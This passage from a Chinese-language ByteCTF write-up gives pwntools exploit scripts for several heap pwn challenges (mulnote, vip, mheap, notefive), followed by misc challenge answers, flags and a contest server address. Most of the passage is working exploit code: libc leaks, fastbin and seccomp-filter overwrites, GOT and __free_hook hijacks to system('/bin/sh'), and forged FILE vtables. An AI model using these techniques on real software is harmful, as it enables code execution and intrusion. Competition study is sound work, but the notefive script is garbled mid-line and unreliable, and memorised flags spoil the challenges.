        cmd('R')
        p.recvuntil("index>")
        p.sendline(str(idx))
    def edit(idx,content):
        cmd('E')
        p.recvuntil("index>")
        p.sendline(str(idx))
        p.recvuntil("note>")
        p.send(content)
    def main(host,port=9999):
        global p
        if host:
            p = remote(host,port)
        else:
            p = process("./mulnote")
            gdb.attach(p)
        add(0x68,"A")
        add(0x68,"A")
        add(0x100,"A")
        add(0x10,"A")   #3
        dele(0)
        dele(1)
        dele(2)
        add(0x68,"A")   #0
        show()
        p.recvuntil("1]:\n")
        heap = u64(p.recv(6).ljust(8,'\x00'))-0x41
        info("heap : " + hex(heap))
        p.recvuntil("2]:\n")
        libc.address = u64(p.recv(6).ljust(8,'\x00'))-0x3c4b78
        info("libc : " + hex(libc.address))
        add(0x68,"A")
        dele(4)
        dele(0)
        edit(0,p64(libc.symbols["__malloc_hook"]-0x23)[:6])
        add(0x68,"A")
        one_gadget = libc.address+0x4526a
        info("one_gadget : " + hex(one_gadget))
        add(0x68,"\x00"*0x13+p64(one_gadget))
        p.interactive()
    if __name__ == "__main__":
        libc = ELF("./libc.so",checksec=False)
        # elf = ELF("./mheap",checksec=False)
        main(args['REMOTE'])
## vip
`vip`函数中存在溢出，可以覆写`sock_filter`，将`open("/dev/random",
0)`的返回值改为`ERRNO(0)`即可进行后续利用
    from pwn import *
    def exploit(host, port=9999):
        if host:
            p = remote(host, port)
        else:
            p = process("./vip", env={"LD_PRELOAD":"./libc-2.27.so"})
            gdb.attach(p, '''
                # b *0x00000000004014EB
                c
            ''')
        sa = p.sendafter
        sla = p.sendlineafter
        def alloc(idx):
            sla('choice: ', '1')
            sla('Index: ', str(idx))
        def show(idx):
            sla('choice: ', '2')
            sla('Index: ', str(idx))
        def dele(idx):
            sla('choice: ', '3')
            sla('Index: ', str(idx))
        def edit(idx, size, cont):
            sla('choice: ', '4')
            sla('Index: ', str(idx))
            sla('Size: ', str(size))
            sa('Content: ', cont)
        def vip(name):
            sla('choice: ', '6')
            sa('name: ', name)
        vip('tr3e'*8 + "\x20\x00\x00\x00\x00\x00\x00\x00\x15\x00\x00\x03\x01\x01\x00\x00\x20\x00\x00\x00\x18\x00\x00\x00\x15\x00\x00\x01\x7e\x20\x40\x00\x06\x00\x00\x00\x00\x00\x05\x00\x06\x00\x00\x00\x00\x00\xff\x7f")
        for x in range(4):
            alloc(x)
        dele(1)
        edit(0, 0x68, 'A'*0x50 + p64(0) + p64(0x61) + p64(0x404100))
        alloc(1)
        alloc(0xF)
        edit(0xF, 8, p64(elf.got['free']))
        show(0)
        libc.address = u64(p.recvline(keepends=False).ljust(8, '\x00')) - libc.sym['free']
        info('libc @ '+hex(libc.address))
        edit(0xF, 0x10, p64(libc.sym['__free_hook']) + p64(libc.search('/bin/sh').next()))
        edit(0, 8, p64(libc.sym['system']))
        dele(1)
        p.interactive()
    if __name__ == '__main__':
        elf = ELF('./vip')
        libc = ELF('./libc-2.27.so')
        exploit(args['REMOTE'])
    # bytectf{2ab64f4ee279e5baf7ab7059b15e6d12}
## mheap
程序定义了自己的分配规则，程序的chunk：
    struct chunk{
        size_t size;
        void* next; //only used after free
        char buf[size];
    }
漏洞点在
    _int64 __fastcall read_n(char *buf, signed int len)
    {
      __int64 result; // rax
      signed int v3; // [rsp+18h] [rbp-8h]
      int v4; // [rsp+1Ch] [rbp-4h]
      v3 = 0;
      do
      {
        result = (unsigned int)v3;
        if ( v3 >= len )
          break;
        v4 = read(0, &buf[v3], len - v3);
        if ( !v4 )
          exit(0);
        v3 += v4;
        result = (unsigned __int8)buf[v3 - 1];
      }
      while ( (_BYTE)result != 10 );
      return result;
    }
当buf+len的地址比mmap的尾部还要大时，read返回-1，然后就可以向上读，伪造一个next指针即可
    from pwn import *
    def cmd(command):
        p.recvuntil("Your choice: ")
        p.sendline(str(command))
    def add(idx,sz,content=''):
        cmd(1)
        p.recvuntil("Index: ")
        p.sendline(str(idx))
        p.recvuntil("Input size: ")
        p.sendline(str(sz))
        if content:
            p.recvuntil("Content: ")
            p.send(content)
    def show(idx):
        cmd(2)
        p.recvuntil("Index: ")
        p.sendline(str(idx))
    def dele(idx):
        cmd(3)
        p.recvuntil("Index: ")
        p.sendline(str(idx))
    def edit(idx,content):
        cmd(4)
        p.recvuntil("Index: ")
        p.sendline(str(idx))
        p.send(content)
    def main(host,port=9999):
        global p
        if host:
            p = remote(host,port)
        else:
            p = process("./mheap")
            gdb.attach(p,"b *0x000000000040159B")
        add(0,0xfb0,"A"*0x10+'\n')
        add(0,0x10,"A"*0x10)
        dele(0)
        add(1,0x60,p64(0x00000000004040d0)+'A'*0x2f+'\n')
        add(0,0x23330fc0-0x10,"A"*0x8+p64(elf.got["atoi"])*2+'\n')
        show(1)
        libc.address = u64(p.recv(6).ljust(8,'\x00'))-libc.symbols["atoi"]
        info("libc : " + hex(libc.address))
        edit(1,p64(libc.symbols["system"])+'\n')
        p.recvuntil("Your choice: ")
        p.sendline("/bin/sh\x00")
        p.interactive()
    if __name__ == "__main__":
        libc = ELF("./libc-2.27.so",checksec=False)
        elf = ELF("./mheap",checksec=False)
        main(args['REMOTE'])
## notefive
程序的 edit 功能存在 off_by_one，先overlap，然后一系列利用攻击到 stdout
泄露出libc，我选择的地方是_IO_stdout_2 _1-0x51(1/16的概率) 的位置，那里有个
0xff。然后伪造stderr的vtable，最后触发_ IO_flush_all_lockp  
来 getshell。
    from pwn import *
    def cmd(command):
        p.recvuntil("choice>> ")
        p.sendline(str(command))
    def add(idx,sz):
        cmd(1)
        p.recvuntil("idx: ")
        p.sendline(str(idx))
        p.recvuntil("size: ")
        p.sendline(str(sz))
    def dele(idx):
        cmd(3)
        p.recvuntil("idx: ")
        p.sendline(str(idx))
    def edit(idx,content):
        cmd(2)
        p.recvuntil("idx: ")
        p.sendline(str(idx))
        p.recvuntil("content: ")
        p.send(content)
    def main(host,port=9999):
        global p
        if host:
            p = remote(host,port)
        else:
            p = process("./note_five")
            gdb.attach(p)
        add(0,0x98)
        add(1,0xa8)
        add(2,0x1e8)
        add(3,0xe8)
        dele(1)
        dele(0)
        dele(2)
        dele(3)
        #overlap
        add(0,0xe8)
        add(1,0xf8)
        add(2,0xf8)
        add(3,0x1f8)
        add(4,0xe8)
        dele(0)
        edit(1,"A"*0xf0+p64(0x1f0)+'\x00')
        dele(2)
        add(0,0xe8)
        # t = int(raw_input('guest: '))
        t = 8
        global_maxfast = (t flush
        add(1,1000)
        p.interactive()
    if __name__ == "__main__":
        libc = ELF("./libc.so",checksec=False)
        # elf = ELF("./mheap",checksec=False)
        main(args['REMOTE'])
# Misc
## Hello Bytectf
签到题：bytectf{Hello Bytectf}
## jigsaw
拼图游戏
## betgame
    from pwn import *
    p = remote("112.125.25.81",9999)
    def exp(a,y=1):
        if y == 1:
            if a == "s":
                return "b"
            if a == "j":
                return "s"
            if a == "b":
                return "j"
        elif y == -1:
            if a == "s":
                return "j"
            if a == "b":
                return "s"
            if a == "j":
                return "b"
        else:
            return a
    for i in range(30):
        p.recvuntil("I will use:")
        tmp = p.recvuntil("\n")[-2:-1]
        info(tmp)
        if i%3 == 0:
            p.sendline(exp(tmp,0))
        elif i%3 == 1:
            p.sendline(exp(tmp,-1))
        else:
            p.sendline(exp(tmp,1))
    p.interactive()